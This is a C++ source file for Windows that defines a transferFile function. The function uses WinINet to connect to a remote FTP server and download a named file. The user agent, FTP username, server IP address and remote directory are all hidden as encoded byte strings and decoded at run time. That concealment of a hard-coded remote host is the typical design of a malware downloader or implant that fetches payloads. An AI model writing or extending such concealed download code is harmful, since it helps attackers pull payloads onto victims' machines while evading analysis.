#include "pch.h"
#include "getfile.h"
#include "obfuscate.h"

BOOL transferFile(std::string filename)
{
	char userAgent[115];
	strcpy(userAgent, obf::decode(
		"\xe3\xe4\xd2\xfe\xe0\xc1\xed\x91\x8c\x80\xa4\xbe\xbd\xf1\xd0\x91\xca\xe4\xdf\xe4\xac\xe3\xd8\x9e\x88\x9e\xba\xae\xae\x86\xee\x96\xc0\xbd\x9c\xac\xac\xd5\xba\x8a\x90\x8e\xd5\xee\xe5\xca\xdc\xa8\xcb\xe9\xe3\xfe\xf8\x82\xb9\x8d\x8e\x80\xa7\xa8\xb5\x8e\xf2\xb7\xfa\xc6\xe4\xbb\xac\xc1\xe5\xd5\xdc\x8e\xd3\xfb\xf6\xcd\xd6\xd6\x8e\xc8\xc0\xe5\xe3\xc0\xe9\x91\x8c\x96\xba\xae\xbb\x95\x89\xcd\x97\xa5\x99\xa6\xbc\x8d\xdf\xdf\xdf\xcf\xe6\xf7\xba\x93\x8a\xc8\x80\xb8\x9e").c_str());

	// get the ftp username
	char ftpUsername[10];
	strcpy(ftpUsername, obf::decode("\xcf\xe5\xc7\xf9\xf5\xc0\xe3\xcb\xca").c_str());

	// get the ip address of the ftp server
	char remoteFTPServer[15];
	strcpy(remoteFTPServer, obf::decode("\x9f\xb2\x9a\xb9\xbd\x9b\xb4\x90\x8c\x98\xba\xaf\xa5\x94").c_str());

	HINTERNET hInternet = InternetOpenA(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);

	if (hInternet == NULL) return FALSE;

	HINTERNET hConnect = InternetConnectA(
		hInternet,
		remoteFTPServer,
		INTERNET_DEFAULT_FTP_PORT,
		ftpUsername,
		NULL,
		INTERNET_SERVICE_FTP,
		INTERNET_FLAG_PASSIVE,
		0);

	if (hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return FALSE;
	}

	char dir[5];
	strcpy(dir, obf::decode("\x81\xfb\xdd\xf5").c_str());

	BOOL cd = FtpSetCurrentDirectoryA(hConnect, dir);

	BOOL isGetSuccess = FtpGetFileA(
		hConnect,
		filename.c_str(),
		filename.c_str(),
		FALSE,
		FILE_ATTRIBUTE_NORMAL,
		FTP_TRANSFER_TYPE_ASCII,
		0
	);

	if (!isGetSuccess)
	{
		InternetCloseHandle(hInternet);
		InternetCloseHandle(hConnect);
		return FALSE;
	}

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hConnect);

	return isGetSuccess;
}